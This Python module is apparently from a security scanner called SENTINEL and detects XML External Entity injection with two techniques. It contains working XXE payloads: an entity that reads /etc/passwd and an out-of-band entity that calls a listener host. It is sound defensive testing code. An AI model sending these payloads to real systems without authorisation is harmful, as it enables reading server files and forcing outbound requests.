"""XML External Entity injection detection — two independent techniques.

1. LOCAL-FILE-READ (original, Phase 7): entity resolves file:///etc/passwd,
   checks the RESPONSE for a traversal-indicator signature. Only catches XXE
   where the target reflects file content back, and only if /etc/passwd (or an
   equivalent) actually exists and is readable at a predictable path.

2. OOB-BASED (this phase): when `target.oob_client` is configured, the entity's
   SYSTEM identifier points at a SENTINEL-controlled listener instead of a local
   file. If the XML parser resolves external entities via HTTP at all — the far
   more universal and realistic XXE confirmation technique, since it doesn't
   depend on any particular file existing — the listener receives the callback.
   This is direct network-level proof, reported at higher confidence than the
   file-read path.

Both techniques run when OOB is configured; only #1 runs otherwise. Only
meaningful against endpoints known to accept a form body (a reasonable, if
imperfect, proxy for "accepts a request body" — SENTINEL doesn't currently track
per-endpoint accepted content-types). Requires ACTIVE mode.
"""

from __future__ import annotations

import httpx

from app.core.http_client import SentinelHTTPClient
from app.scanners.base import DeterministicScanner, ScanTarget
from app.scanners.util import TRAVERSAL_INDICATORS as _TRAVERSAL_INDICATORS
from app.scope.engine import ScopeViolation
from app.tools.models import NormalizedFinding

_FILE_READ_PAYLOAD = (
    '<?xml version="1.0"?>\n'
    "<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
    "<data>&xxe;</data>"
)


def _oob_payload(callback_url: str) -> str:
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE data [<!ENTITY xxe SYSTEM "{callback_url}">]>\n'
        "<data>&xxe;</data>"
    )


class XXEScanner(DeterministicScanner):
    name = "xxe"
    vulnerability_class = "xxe"
    required_mode = "active"

    async def scan(
        self, target: ScanTarget, http_client: SentinelHTTPClient
    ) -> list[NormalizedFinding]:
        if target.method.upper() not in ("POST", "PUT"):
            return []
        if target.form_fields is None:
            return []

        findings: list[NormalizedFinding] = []

        if target.oob_client is not None:
            oob_finding = await self._try_oob_confirmation(target, http_client)
            if oob_finding is not None:
                findings.append(oob_finding)

        file_read_finding = await self._try_file_read(target, http_client)
        if file_read_finding is not None:
            findings.append(file_read_finding)

        return findings

    async def _try_oob_confirmation(
        self, target: ScanTarget, http_client: SentinelHTTPClient
    ) -> NormalizedFinding | None:
        oob = target.oob_client
        correlation_id = oob.generate_correlation_id()
        callback_url = oob.build_callback_url(correlation_id)
        payload = _oob_payload(callback_url)

        try:
            await http_client.request(
                target.method, target.url, content=payload.encode(),
                headers={"Content-Type": "application/xml"},
            )
        except (httpx.HTTPError, ScopeViolation):
            pass

        confirmed = await oob.register_and_wait(
            correlation_id=correlation_id,
            scan_id=target.oob_scan_id or "",
            vulnerability_class=self.vulnerability_class,
            matched_endpoint=target.url,
        )
        if not confirmed:
            return None

        return NormalizedFinding(
            tool_name=self.name,
            tool_version=None,
            title="Confirmed XXE: external entity resolved via out-of-band callback",
            severity="critical",
            matched_endpoint=target.url,
            raw_output=f"OOB listener received a callback for correlation ID {correlation_id}",
            metadata={
                "vulnerability_class": self.vulnerability_class,
                "confidence": "high",
                "detection_method": "oob_confirmed",
                "correlation_id": correlation_id,
            },
        )

    async def _try_file_read(
        self, target: ScanTarget, http_client: SentinelHTTPClient
    ) -> NormalizedFinding | None:
        try:
            response = await http_client.request(
                target.method, target.url, content=_FILE_READ_PAYLOAD.encode(),
                headers={"Content-Type": "application/xml"},
            )
        except (httpx.HTTPError, ScopeViolation):
            return None

        lowered = response.text.lower()
        if not any(indicator in lowered for indicator in _TRAVERSAL_INDICATORS):
            return None

        return NormalizedFinding(
            tool_name=self.name,
            tool_version=None,
            title="Possible XXE: external entity resolved local file content",
            severity="critical",
            matched_endpoint=target.url,
            raw_output="response body contains a traversal indicator string after XXE payload",
            metadata={
                "vulnerability_class": self.vulnerability_class,
                "confidence": "low",
                "detection_method": "file_read_reflection",
            },
        )
